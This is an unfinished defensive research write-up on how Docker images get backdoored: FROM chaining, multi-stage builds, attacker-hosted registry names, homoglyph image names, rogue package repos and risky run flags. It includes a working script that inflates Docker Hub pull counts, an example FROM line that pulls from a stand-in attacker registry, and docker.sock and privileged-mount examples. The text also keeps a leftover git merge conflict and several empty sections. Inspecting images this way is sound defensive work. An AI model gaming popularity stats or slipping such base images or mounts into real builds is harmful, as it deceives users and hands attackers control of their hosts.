# (WIP) Research on docker backdooring
Pantelis Roditis (09/07/2020)

As the main developer of echoCTF.RED, I have to develop docker containers quite
often that will be used as targets or challenges.

This leads to the unavoidable search on docker hub and github for docker images
and dockerfiles that may give be a hint on how to implement them my self.

During this time I have come across a load of different types of suspicious
docker images and repositories.

Just like any other software you download from the internet use common logic
and critical thinking. Do NOT blindly trust a docker image, simply because it
can be found on docker hub.

This document includes research on some of the docker features that can be
abused in just the right way to make them look innocent, and advice on what you
can inspect to determine if an image does good or bad.

This list is in no means complete, these include just some of the things that
I look for, when inspecting docker images.

Some of the mentioned details i have seen by accident while browsing docker hub
and some came as a realization after reading hundreds of dockerfiles.

## Docker Hub stats
First and foremost don't trust stats provided by docker hub, these can be very easy to manipulate.

If an image for an obscure application has suspiciously high numbers of pulls/stars then something might be fishy.

The pulls in particularly can be so easily abused that it takes less than a minute to make an image have thousands of pulls.

My favorite method is to use **ab** but **curl** can also work. Check the examples to get a better idea.

```sh
name="repo/image"
token=$( curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:${name}:pull" | jq -r .token )
curl -s -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest" >/dev/null
# or
ab -n 50 -c 10 -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest"
```

## `Dockerfile`
The truth is that almost every single statement that can be used on a `Dockerfile` can hide something sinister. The nature of docker images make it so that is quite hard to track and ensure that what is installed is clean of any malicious code.  


### The `FROM` statement
Usually one of the top most statements of a `Dockerfile`.  It is used to instruct docker to use another image as a base. Any following commands within the `Dockerfile` will be executed as if they were run from within a container of the imported image.

<<<<<<< HEAD
Usual tricks that can be found in this section include but not limited to the following.
=======
In general it is always a good idea to look for the `FROM` statements and trace them back on docker hub to see if they use official images or not. Some of the  tricks that can be found in `FROM` statements follows.
>>>>>>> 3578d3010de59a2607271c2cd25d4592bba0580d

### `FROM` Chaining
Another trick that I've seen be used is what I call the _FROM chaining_. This is for images that depend on another, that in turn depend on other etc. etc. All the images seem clean but somewhere in the midst of all those images there's the one that adds the backdoored bash or whatever.


#### Multi-stage builds
A `Dockerfile` can have more than one `FROM` statements. Import from a legitimate image, perform some tasks to confuse user and import a malicious image last to be executed.

```Dockerfile
FROM debian
RUN apt-get install curl bash
...
FROM backdoor
```

Although the image started with `FROM debian` it will end up running whatever `FROM backdoor` image has.

#### Image with URL as part of name
One of the things that `docker` will do for you is to parse as URL the image name. This means that the following statement is valid
```sh
FROM badregistry.attacker.io/repo/backdoor:latest
```

Upon building this image docker will connect to `badregistry.attacker.io:443` and attempt to fetch the image `repo/backdoor`



#### Unicode `FROM` image

Pay close attention at the FROM image names as Unicode characters can be used to make it look like it came from a legit repository.

* [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)
* [Unicode Bidirectional Text Spoofing](http://unicode.org/reports/tr36/tr36-8.html#Bidirectional_Text_Spoofing)

### The RUN statement

## The COPY/ADD statement
Pay close attention to `COPY` commands and more specificaly the `COPY --from=<name|index>`. Remember the multi-stage builds from above? This is where the COPY command may come in handy.

### The CMD statement

### The ENTRYPOINT statement

## The entrypoint.sh script

## Package manager repos
Pay attention at what package managers the container uses and ensure there are no bad repos in there.

System package managers can be manipulated to query specific repositories. You may see the common `RUN apt-get update && apt-get install bash`, but this `bash` package may be hosted on a non official repository.

It is always good to check the files for the package managers used. Whatever it may be (go, npm, yarn, pip, apt, apk, rpm, dnf) check the corresponding files used to find the packages.


## The docker run/create CLI params
Pay close attention at the docker parameters required to run the container. The parameters that usually make me suspicious follows.

### `--privileged` & `--cap-add`
The `--privileged` parameter gives extended privileges to the container. Be weary of images that require this flag, specifically when the image has no logical need for it, e.g. for a webapp there is no need for a privileged container.

```sh
docker run --privileged php bash
docker run -it --privileged=true --net=host --name=tcpdump -v /var/lib/mysql:/capture --rm alpine-tcpdump -i any -vvnn -w /capture/file_name /capture.pcap icmp
```

The `--cap-add` adds Linux capabilities. Pay attention at what type of capabilities are added and check online for what the capability provides. Just like before apply critical thinking, very few types of applications require you to mess with capabilities.

```sh
docker run --cap-add SYS_ADMIN -t -i --rm ubuntu bash
```


### `--v`
Maps docker volumes, a volume can be any file or directory. Pay attention at what kind of volumes and what locations those volumes represent.

Keep in mind that the existence of these parameters do not mean that an image is malicious. Many containers require these options to operate properly, apply common logic when you see these.

Pay attention when images
* require access to `docker.sock`, this is almost never a good idea. This allows full control of the host `dockerd`, is as if you're giving root access to your server
* variables with typos used for volumes (eg `$PWR` instead of `$PWD`). The shell will not complain and in some cases its not easy to spot.

```sh
docker run -v /var/run/docker.sock:/var/run/docker.sock badimage
docker run -v $PWR/etc:/etc badimage
```

## Refs
* https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet
* https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers
